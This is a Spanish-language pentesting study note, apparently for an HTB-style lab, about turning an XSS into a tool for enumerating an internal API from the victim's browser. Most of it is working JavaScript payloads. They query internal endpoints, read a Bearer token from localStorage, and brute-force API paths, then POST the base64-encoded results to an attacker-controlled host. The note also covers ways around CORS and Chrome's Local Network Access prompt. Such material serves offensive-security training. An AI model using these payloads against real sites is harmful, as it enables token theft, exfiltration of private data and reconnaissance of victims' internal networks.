---
tags:
  - Web/Red-Team
  - Pentesting/Enumeracion
  - XSS
Fecha de actualización: 2026-06-08
Nota previa: "[[01 - Ataques desde la sesión de la víctima]]"
Nota siguiente: "[[03 - Pivote a aplicaciones internas]]"
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

El payload XSS ejecuta en el navegador de la víctima, así que <mark style="background: #FFB86CA6;">alcanza recursos que el atacante no puede tocar directamente: APIs internas accesibles solo desde la red de la víctima</mark>. Al exfiltrar un panel admin solemos encontrar referencias a una API interna (`https://api.internal-apis.htb/`) que devuelve `403` si la pedimos desde fuera. La vía es enumerarla desde el navegador de la víctima.

# El problema: la Same-Origin Policy sigue ahí

Atacar la API interna no es tan simple como cambiar la URL del payload. La API es otro origen, así que la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]] impide leer su respuesta salvo que tenga CORS configurado. <mark style="background: #FF5582A6;">La clave es replicar **exactamente** la configuración con la que el código legítimo habla con la API</mark>.

Si el JavaScript del panel admin hace el `fetch` **sin** `credentials: 'include'`, y nuestro payload sí pone `withCredentials = true`, la API —que no envía `Access-Control-Allow-Credentials`— rechaza la petición con un error CORS y no leemos nada. La solución es copiar la configuración del `fetch` filtrado: si él no manda credenciales, nosotros tampoco.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
// sin withCredentials, igual que el fetch legítimo
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

# Depurar el error CORS con `try-catch`

Como no podemos ver la respuesta ni las cabeceras CORS de la API (no la alcanzamos directamente), depurar a ciegas es frustrante. <mark style="background: #8000E1A6;">Un error CORS lanza una excepción que **detiene** el resto del payload</mark>; envolver la petición en `try-catch` y exfiltrar el propio error permite ver qué falla y ajustar la configuración:

```js
try {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
	xhr.withCredentials = true;
	xhr.send();
	var msg = xhr.responseText;
} catch (error) {
	var msg = error;     // exfiltramos el error para diagnosticar
}
var exfil = new XMLHttpRequest();
exfil.open("POST", "https://10.10.14.144:4443/log", true);
exfil.setRequestHeader("Content-Type", "application/json");
exfil.send(JSON.stringify({data: btoa(msg)}));
```

# Autenticación: cookies vs `Bearer` en `localStorage`

Una API interna puede autenticar por cookie o por token `Bearer`. <mark style="background: #FFB8EBA6;">Muchas SPA guardan el token en `localStorage`</mark>, accesible por JavaScript en el origen de la app vulnerable. Si la API espera un `Authorization: Bearer ...`, lo leemos y lo añadimos:

```js
xhr.setRequestHeader('Authorization', 'Bearer ' + localStorage.getItem('token'));
```

# Brute-force de endpoints desde el payload

Con la configuración CORS correcta, enumeramos la API implementando un *directory brute-forcer* en el propio payload, que prueba cada endpoint de una wordlist (por ejemplo `objects-lowercase.txt` de `SecLists`) y exfiltra los que no devuelven `404`:

```js
var endpoints = ['account','accounts','token','tokens','user','users','login','logs','settings','...'];
for (var i = 0; i < endpoints.length; i++){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `https://api.internal-apis.htb/v1/${endpoints[i]}`, false);
		xhr.send();
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("POST", "https://10.10.14.144:4443/log", true);
			exfil.setRequestHeader("Content-Type", "application/json");
			exfil.send(JSON.stringify({data: btoa(endpoints[i])}));
		}
	} catch { /* ignorar */ }
}
```

Se puede ampliar probando distintos métodos HTTP o brute-forceando parámetros. Se usa un bucle `for` clásico en vez de `for...in` a propósito: en una página de terceros que no controlas, `Array.prototype` podría estar contaminado (*prototype pollution*) y `for...in` iteraría también esas propiedades heredadas.

> [!warning]+ El `status` solo se lee con CORS
> Comprobar `xhr.status != 404` solo funciona si la API responde con cabeceras CORS que permitan a la app vulnerable leer la respuesta. Sin CORS, la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]] deja `xhr.status` en `0` y la petición cae al `catch` — no se distingue un `200` de un `404`. En ese caso, la enumeración a ciegas se infiere por *timing* o por el tipo de error (red vs CORS).

> [!warning]+ 🔴 Local Network Access limita esto en Chrome actual
> Igual que en el [[03 - CORS Misconfigurations|ataque a la red interna por CORS]], si la API interna vive en una IP privada o `localhost`, **Local Network Access** (Chrome 142+) interpone un prompt de permiso antes de que el navegador público contacte la red local. Contra un Chrome moderno, asume que necesitas que la víctima conceda el permiso, o un contexto que ya lo tenga. Sigue funcionando si la "API interna" es un host con DNS público pero firewall por IP (como en el lab), porque entonces no se cruza el límite público→privado que vigila LNA.

Cuando el objetivo no es una API sino una aplicación interna completa con sus propias vulnerabilidades, el XSS se convierte en plataforma de explotación remota: [[03 - Pivote a aplicaciones internas]].

> [!info]+ Fuentes de referencia
> - [MDN — localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
> - [SecLists — API wordlists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/api)
